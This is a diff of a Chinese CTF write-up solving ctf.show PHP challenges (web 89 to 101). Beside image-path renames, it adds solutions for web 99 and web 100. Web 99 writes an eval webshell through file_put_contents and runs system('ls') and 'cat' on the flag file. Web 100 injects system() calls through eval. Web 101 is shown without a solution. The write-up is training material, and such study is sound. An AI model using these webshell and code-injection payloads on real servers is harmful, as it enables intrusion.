@@ -33,7 +33,7 @@ if(isset($_GET['num'])){
 } 
 ```
 
-<figure><img src="../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 代码逻辑很简单，就是我们要让匹配$num的结果是0，然后$num变量通过intval为1就可以了。对于preg\_match匹配要是0，就说明不能是数字，但是如果是字符串的话，在下面的intval匹配中就会为0，这个时候我们要想到如果$num传入一个数组，那么对于pre\_match的特性，就会输出false然后我们就会进入else语句然后num是个数组并且不为空的话，就会输出1，也就是我们的num要通过url解析成一个不为空的数组。
 
@@ -54,7 +54,7 @@ URL解析差异！！！！！！！！！
 http://65b4d1c3-5cc4-426c-b856-e5c14d755ef0.challenge.ctf.show/?num[]="abc"
 ```
 
-<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -93,7 +93,7 @@ if(isset($_GET['num'])){
 
 ```
 
-<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### <mark style="color:green;">①代码解释</mark>
 
@@ -109,7 +109,7 @@ if(isset($_GET['num'])){
 http://f855998e-1508-4b60-9956-e03eadde4e40.challenge.ctf.show/?num=4476ab
 ```
 
-<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -148,7 +148,7 @@ Notice: Undefined index: cmd in /var/www/html/index.php on line 15
 nonononono
 ```
 
-<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### <mark style="color:green;">①代码解释</mark>
 
@@ -162,7 +162,7 @@ nonononono
 http://4e1772d9-0414-4f78-a71b-8b49260e5e5e.challenge.ctf.show/?cmd=%0aphp
 ```
 
-<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -195,7 +195,7 @@ if(isset($_GET['num'])){
     } 
 ```
 
-<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### <mark style="color:green;">①代码解释</mark>
 
@@ -209,7 +209,7 @@ if(isset($_GET['num'])){
 http://33ebd11e-67ab-47ec-af2f-b2571baba355.challenge.ctf.show/?num=0x117c
 ```
 
-<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -248,7 +248,7 @@ if(isset($_GET['num'])){
 } 
 ```
 
-<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### <mark style="color:green;">①代码解释</mark>
 
@@ -262,7 +262,7 @@ if(isset($_GET['num'])){
 http://8e3950a6-590f-4e78-89d3-327e81f2a858.challenge.ctf.show/?num=010574
 ```
 
-<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -302,7 +302,7 @@ if(isset($_GET['num'])){
 } 
 ```
 
-<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### <mark style="color:green;">①代码解释</mark>
 
@@ -450,7 +450,7 @@ if(isset($_GET['u'])){
 http://0436b3c8-9edb-4ec3-8bf3-bf546aa4699b.challenge.ctf.show/?u=./flag.php
 ```
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -481,7 +481,7 @@ print 'Wrong.';
 ?> 
 ```
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### <mark style="color:green;">①代码解释</mark>
 
@@ -503,7 +503,7 @@ POST:
 a[]=1&b[]=2
 ```
 
-<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -538,7 +538,7 @@ highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);
 
 ```
 
-<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## <mark style="color:green;">①代码解释</mark>
 
@@ -584,19 +584,201 @@ POST：
 HTTP_FLAG=flag
 ```
 
-<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
 ## <mark style="color:purple;background-color:red;">（11）web 99</mark>
 
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-18 22:36:12
+# @link: https://ctfer.com
+
+*/
+
+highlight_file(__FILE__);
+$allow = array();
+for ($i=36; $i < 0x36d; $i++) { 
+    array_push($allow, rand(1,$i));
+}
+if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
+    file_put_contents($_GET['n'], $_POST['content']);
+}
+
+?> 
+```
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+### <mark style="color:green;">①代码解释</mark>
+
+allow变量是个数组，将从1到变量i的数字随机生成一个推入到allow数组里面，然后get传入n，如果传入成功并且n再allow数组里面存在的话，那么就用post方式传入内容写入到n当中。
+
+### <mark style="color:green;">②思路解释</mark>
+
+其实从file\_put\_contents函数，我们知道n传入的是个文件，post传入的是文件内容。所以n应该是个php文件，post传入一个getshell。然后又因为n要在allow数组里面，并且allow是1到i当中的数字。因为每一次都是从1到某个数字，所以1的概率还是很大的，我们就取n为1.php。至于判断是否在数组当中。我们之前其实在将php特性知识点的时候提到过，与数组中的元素比较的时候，会发生强制转换。所以1.php会变成1.
+
+所以最后的结果是
+
+GET
+
+```url
+http://efcbe0f7-b5f2-46d4-88c7-f7f588b31085.challenge.ctf.show/?n=1.php
+```
+
+POST
+
+```url
+content=<?php @eval($_POST['x'])?>
+```
+
+然后我们再进入1.php文件里面，输入我们的shell，我们这里是查看当前文件。
+
+GET：
+
+```url
+http://efcbe0f7-b5f2-46d4-88c7-f7f588b31085.challenge.ctf.show/1.php
+```
+
+POST
+
+```url
+x=system("ls");
+```
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+然后我们再将post代码修改为查看flag36d.php文件的代码。然后查看源码得到flag。
+
+POST：
+
+```url
+x=system("cat flag36d.php");
+```
+
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+## <mark style="color:purple;background-color:red;">（12）WEB 100</mark>
+
+```php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-21 22:10:28
+# @link: https://ctfer.com
+
+*/
+
+highlight_file(__FILE__);
+include("ctfshow.php");
+//flag in class ctfshow;
+$ctfshow = new ctfshow();
+$v1=$_GET['v1'];
+$v2=$_GET['v2'];
+$v3=$_GET['v3'];
+$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
+if($v0){
+    if(!preg_match("/\;/", $v2)){
+        if(preg_match("/\;/", $v3)){
+            eval("$v2('ctfshow')$v3");
+        }
+    }
+    
+}
 
 
+?>
 
+Notice: Undefined index: v1 in /var/www/html/index.php on line 17
 
+Notice: Undefined index: v2 in /var/www/html/index.php on line 18
 
+Notice: Undefined index: v3 in /var/www/html/index.php on line 19
+```
 
+<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
+### <mark style="color:green;">①代码解释</mark>
+
+创建了一个ctfshow的类,然后用get的方式传入v1，v2，v3。接下来这个要用到运算符的优先级（开始的时候我并不知道=的优先级高于and。），因为= > and，所以is\_numeric($v1)的结果赋值给$v0。并且如果v0为1，之后v2不能有分号，v3要有分号。然后执行一个拼接的执行代码。
+
+### <mark style="color:green;">②思路解释</mark>
+
+因为v0一定要是1，所以v1一定要是数字。v2不能含有分号，但是v2后面是要指令，v3得是分号。所以我们的方案是
+
+```url
+http://4eb5f1fe-a9fd-4f35-ab83-1e6102816cd2.challenge.ctf.show/?v1=1&v2=system("ls")&v3=;
+```
+
+<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+```url
+http://4eb5f1fe-a9fd-4f35-ab83-1e6102816cd2.challenge.ctf.show/?v1=1&v2=system("tac ct*")&v3=;
+```
+
+<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+把得到的flag is后面的字符串里面的0x2d换成-就是flag。
+
+***
+
+## <mark style="color:purple;background-color:red;">（13）web 101</mark>
+
+```php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-22 00:26:48
+# @link: https://ctfer.com
+
+*/
+
+highlight_file(__FILE__);
+include("ctfshow.php");
+//flag in class ctfshow;
+$ctfshow = new ctfshow();
+$v1=$_GET['v1'];
+$v2=$_GET['v2'];
+$v3=$_GET['v3'];
+$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
+if($v0){
+    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\;|\?|[0-9]/", $v2)){
+        if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\?|[0-9]/", $v3)){
+            eval("$v2('ctfshow')$v3");
+        }
+    }
+    
+}
+
+?>
+
+Notice: Undefined index: v1 in /var/www/html/index.php on line 17
+
+Notice: Undefined index: v2 in /var/www/html/index.php on line 18
+
+Notice: Undefined index: v3 in /var/www/html/index.php on line 19
+```
+
+<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
 
 
